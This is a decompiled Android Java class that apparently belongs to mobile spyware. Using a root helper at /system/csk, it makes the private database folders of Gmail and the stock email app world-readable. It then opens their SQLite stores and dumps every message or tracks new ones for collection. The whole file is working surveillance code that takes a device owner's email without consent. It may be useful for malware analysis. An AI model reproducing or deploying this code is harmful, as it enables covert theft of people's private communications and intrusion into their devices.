package com.network.android;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.network.android.c.a.a;
import java.io.File;
import java.util.LinkedList;
import java.util.concurrent.locks.ReentrantReadWriteLock;

/* access modifiers changed from: package-private */
public final class s implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ boolean f127a;
    final /* synthetic */ int b;
    final /* synthetic */ Context c;

    s(boolean z, int i, Context context) {
        this.f127a = z;
        this.b = i;
        this.c = context;
    }

    public final void run() {
        String str;
        ReentrantReadWriteLock.ReadLock readLock;
        SQLiteDatabase sQLiteDatabase = null;
        try {
            a.a("GetContentMail getMailDb isDump: " + this.f127a);
            if (!new File("/system/csk").exists()) {
                a.a("GetContent getMailDb MY_SU does not exists. returning");
                return;
            }
            if (this.b == 1) {
                a.a("GetContentMail getMailDb EMAIL");
                str = "/data/data/com.google.android.gm";
            } else {
                a.a("GetContentMail getMailDb MAIL");
                str = "/data/data/com.android.email";
            }
            a.a("GetContentMail Mail messages:" + str);
            String str2 = str + "/databases";
            if (!new File(str).exists()) {
                a.a("GetContentMail getMailDb mail not exists -> exit!: " + str);
                return;
            }
            readLock = new ReentrantReadWriteLock().readLock();
            readLock.lock();
            m.b("0777", str2);
            String[] d = m.d(str2);
            m.a("0777", str2, d);
            LinkedList<String> linkedList = new LinkedList();
            if (this.b == 1) {
                for (int i = 0; i < d.length; i++) {
                    String str3 = d[i];
                    if (r.a(str3)) {
                        linkedList.add(str3);
                        a.a("GetContentMail getMailDb add mail DB:" + d[i]);
                    }
                }
            } else {
                linkedList.add("EmailProvider.db");
                a.a("GetContentMail Mail add mail path: EmailProvider.db");
            }
            a.a("GetContentMail getMailDb get messages number of DBs:" + linkedList.size());
            if (linkedList.size() > 0) {
                Cursor cursor = null;
                for (String str4 : linkedList) {
                    try {
                        String str5 = str2 + "/" + str4;
                        a.a("GetContentMail getMailDb messages DB:" + str4);
                        a.a("GetContentMail getMailDb messages DB path:" + str5);
                        try {
                            sQLiteDatabase = SQLiteDatabase.openDatabase(str5, null, 16);
                        } catch (Throwable th) {
                            a.a("GetContentMail getMailDb openDatabase try to OPEN_READONLY ");
                            sQLiteDatabase = SQLiteDatabase.openDatabase(str5, null, 17);
                        }
                        if (this.f127a) {
                            cursor = this.b == 1 ? sQLiteDatabase.rawQuery("select * from messages", null) : sQLiteDatabase.rawQuery("select * from Message", null);
                        } else {
                            SharedPreferences sharedPreferences = this.c.getSharedPreferences("NetworkMail", 0);
                            String string = sharedPreferences.getString(h.b(str4), null);
                            if (string == null) {
                                a.a("GetContentMail getMailDb monitor set last id");
                                String str6 = this.b == 1 ? "select _id from messages order by _id desc limit 1;" : "select _id from Message order by _id desc limit 1;";
                                a.a("GetContentMail get mail monitor set last id Query: " + str6);
                                Cursor rawQuery = sQLiteDatabase.rawQuery(str6, null);
                                if (rawQuery == null) {
                                    a.a("GetContentMail getMailDb emailProviderDBIndex == null  no messages");
                                    try {
                                        a.a("GetContentMail getMailDb inner message reader finally");
                                        if (sQLiteDatabase != null) {
                                            sQLiteDatabase.close();
                                        }
                                        if (cursor != null) {
                                            cursor.close();
                                        }
                                    } catch (Throwable th2) {
                                        a.a("GetContentMail getMailDb inner message reader finally exception- " + th2.getMessage(), th2);
                                    }
                                } else if (rawQuery.moveToFirst()) {
                                    string = rawQuery.getString(0);
                                    a.a("GetContentMail getMailDb last id: " + string);
                                    a.a("GetContentMail getMailDb added NEW last id: " + string);
                                    SharedPreferences.Editor edit = sharedPreferences.edit();
                                    edit.putString(h.b(str4), string);
                                    edit.commit();
                                    if (string == null) {
                                        a.a("GetContentMail getMailDb there are no messages or failed to fatche them");
                                        try {
                                            a.a("GetContentMail getMailDb inner message reader finally");
                                            if (sQLiteDatabase != null) {
                                                sQLiteDatabase.close();
                                            }
                                            if (cursor != null) {
                                                cursor.close();
                                            }
                                        } catch (Throwable th3) {
                                            a.a("GetContentMail getMailDb inner message reader finally exception- " + th3.getMessage(), th3);
                                        }
                                    }
                                } else {
                                    a.a("GetContentMail getMailDb no messages");
                                    try {
                                        a.a("GetContentMail getMailDb inner message reader finally");
                                        if (sQLiteDatabase != null) {
                                            sQLiteDatabase.close();
                                        }
                                        if (cursor != null) {
                                            cursor.close();
                                        }
                                    } catch (Throwable th4) {
                                        a.a("GetContentMail getMailDb inner message reader finally exception- " + th4.getMessage(), th4);
                                    }
                                }
                            } else {
                                a.a("GetContentMail getMailDb preference mailIndex: " + string);
                            }
                            String str7 = this.b == 1 ? "select * from messages where _id > '" + string + "' " : "select * from Message where _id > '" + string + "' ";
                            a.a("GetContentMail get mail monitor query: " + str7);
                            cursor = sQLiteDatabase.rawQuery(str7, null);
                            if (cursor == null) {
                                a.a("GetContentMail getMailDb on monitor curEmailProvider == null return");
                                try {
                                    a.a("GetContentMail getMailDb inner message reader finally");
                                    if (sQLiteDatabase != null) {
                                        sQLiteDatabase.close();
                                    }
                                    if (cursor != null) {
                                        cursor.close();
                                    }
                                } catch (Throwable th5) {
                                    a.a("GetContentMail getMailDb inner message reader finally exception- " + th5.getMessage(), th5);
                                }
                            }
                        }
                        if (cursor == null) {
                            a.a("GetContentMail getMailDb dump curEmailProvider == null return");
                            try {
                                a.a("GetContentMail getMailDb inner message reader finally");
                                if (sQLiteDatabase != null) {
                                    sQLiteDatabase.close();
                                }
                                if (cursor != null) {
                                    cursor.close();
                                }
                            } catch (Throwable th6) {
                                a.a("GetContentMail getMailDb inner message reader finally exception- " + th6.getMessage(), th6);
                            }
                        } else {
                            r.a(this.c, str2, cursor, sQLiteDatabase, str4, this.b);
                            try {
                                a.a("GetContentMail getMailDb inner message reader finally");
                                if (sQLiteDatabase != null) {
                                    sQLiteDatabase.close();
                                }
                                if (cursor != null) {
                                    cursor.close();
                                }
                            } catch (Throwable th7) {
                                a.a("GetContentMail getMailDb inner message reader finally exception- " + th7.getMessage(), th7);
                            }
                        }
                    } catch (Throwable th8) {
                        a.a("GetContentMail getMailDb inner message reader finally exception- " + th8.getMessage(), th8);
                    }
                }
            } else {
                a.a("GetContentMail getMailDb NO DBs DBs:" + linkedList.size());
            }
            a.a("GetContentMail getMailDb end");
            try {
                a.a("GetContentMail getMailDb finally");
                readLock.unlock();
            } catch (Throwable th9) {
                a.a("GetContentMail getMailDb finally exception- " + th9.getMessage(), th9);
            }
        } catch (Throwable th10) {
            a.a("GetContentMail getMailDb - " + th10.getMessage(), th10);
        }
    }
}
